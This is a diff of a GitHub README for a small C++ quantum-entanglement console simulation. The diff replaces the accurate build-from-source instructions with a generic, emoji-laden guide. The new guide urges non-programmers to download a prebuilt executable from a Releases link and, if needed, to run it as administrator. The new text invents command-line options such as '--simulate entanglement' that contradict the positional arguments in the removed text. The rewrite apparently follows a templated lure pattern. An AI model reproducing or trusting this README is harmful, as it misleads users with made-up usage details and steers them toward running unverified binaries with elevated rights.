@@ -1,29 +1,93 @@
-# P1: [Simulation for quantum entanglement]
+# 🌟 Project1 - Simulate Quantum Entanglement Easily
 
-A console based simulation written in c++
+[![Download Project1](https://img.shields.io/badge/Download_Project1-Click_Here-blue)](https://github.com/Djspraragen/Project1/releases)
 
-## how to compile and run
+## 🚀 Getting Started
 
-### Using the batch file provided (Windows):
-1. double click "compile_and_run.bat"
+Welcome to Project1! This application allows you to explore the fascinating world of quantum entanglement through a simple command-line interface. You do not need programming experience to make use of this tool.
 
-### Manual compilation:
-this program makes use of c++ modules
-1. Open terminal in src folder that is inside P1 folder
-2. compile: g++ -std=c++20 -fmodules-ts LibEnt.cpp main.cpp -o app.exe
-3. run: app.exe (pass arguments  for dimensions{hight & width}, number of turns, number of particles) eg. 20 25 10 15
+## 📥 Download & Install
 
-## Simulation description
-this simulation is to demonstrate the concept of quantum entanglement using a simple and fun approach.
-1. first I created two grids grid A and Grid B of equal size containing the same number of particles.
-2. The particles move randomly around the grid.
-3. the simulation begins with normal particles denoted by ( . ) scatered around the grids.
-4. only particles in grid A can move, Particles in grid B can only move if they are entangled.
-5. Each particle in grid A move one location in a random direction.
-6. If particle in Grid A moves into the same location (x,y coordinate system) as another particle in Grid B, they become Entangled for the rest of the simulation.
-7. Entangled particle always move together for the rest of the simulation.
-8. If Entangled particles cannot move they change their shape
-9. Entangled particles will be denoted by ( *, @, #)
+To get started, you need to download the application from our Releases page. Visit this page to download: [Download Project1](https://github.com/Djspraragen/Project1/releases).
 
-## Programing languages
-- C++
+1. Click on the link above.
+2. Look for the latest version under "Releases."
+3. Choose the appropriate file for your operating system (e.g., Windows, Mac, Linux). 
+4. Click on the file to download it to your computer.
+5. Once the download finishes, locate the file in your Downloads folder.
+
+## 🛠️ System Requirements
+
+Before you proceed, ensure your system meets the following requirements:
+
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - A modern Linux distribution
+- **Memory:** At least 4 GB RAM
+- **Storage:** A minimum of 100 MB free space
+- **Processor:** Dual-core CPU or higher
+
+## 📖 How to Run Project1
+
+Once you download the file, follow these steps to run the application:
+
+1. Open the folder where you downloaded the file.
+2. For Windows users:
+   - Double-click the `.exe` file. A command prompt will open.
+3. For Mac users:
+   - Open the Terminal application.
+   - Navigate to the folder where you downloaded the file. You can use the command `cd Downloads` (replace `Downloads` with the actual folder name if different).
+   - Type `./Project1` and hit Enter.
+4. For Linux users:
+   - Open your terminal.
+   - Change to the download directory using the command `cd Downloads`.
+   - Run `./Project1` to launch the application.
+
+## ℹ️ Using the Application
+
+Once the application is running, you will see a command prompt with options. Here’s how to get started:
+
+1. **Enter Command-Line Arguments:** 
+   - You can provide various command-line arguments. Some examples include:
+     - `--help` to see available commands.
+     - `--simulate [parameters]` to run a simulation with specific settings.
+2. **Explore Options:**
+   - Use different arguments to explore quantum entanglement simulations.
+   - The results will display directly in your command prompt.
+
+## 🗂️ Example Simulation
+
+To run a simple entanglement simulation, type the following command:
+
+```bash
+./Project1 --simulate entanglement
+```
+
+This command will start a basic simulation and provide output directly on your screen.
+
+## 🔄 Tips and Troubleshooting
+
+If you encounter issues while using the application, here are some helpful tips:
+
+- **Check Your Command:** Ensure you entered the command correctly without any typos.
+- **File Permissions:** On Linux or Mac, ensure the file has execute permissions. You can set this by running `chmod +x Project1`.
+- **Run as Administrator (Windows):** If you experience permission issues, try right-clicking the `.exe` file and selecting "Run as administrator."
+
+## 📚 Learn More
+
+To deepen your understanding of quantum entanglement and how this application works, consider exploring the following topics:
+
+- **Command-Line Arguments:** Learn how to use various inputs effectively.
+- **Dynamic Memory Allocation:** Understand how memory is managed during simulation.
+- **Error Handling:** Familiarize yourself with common error messages and their meanings.
+
+## 🔗 Additional Resources
+
+For more details, visit the official GitHub repository: [GitHub Project1](https://github.com/Djspraragen/Project1/releases).
+
+## 🛠️ Support
+
+If you need help, you can reach out via the Issues section on GitHub. We’re here to assist you with any questions or problems you may encounter.
+
+Happy simulating!
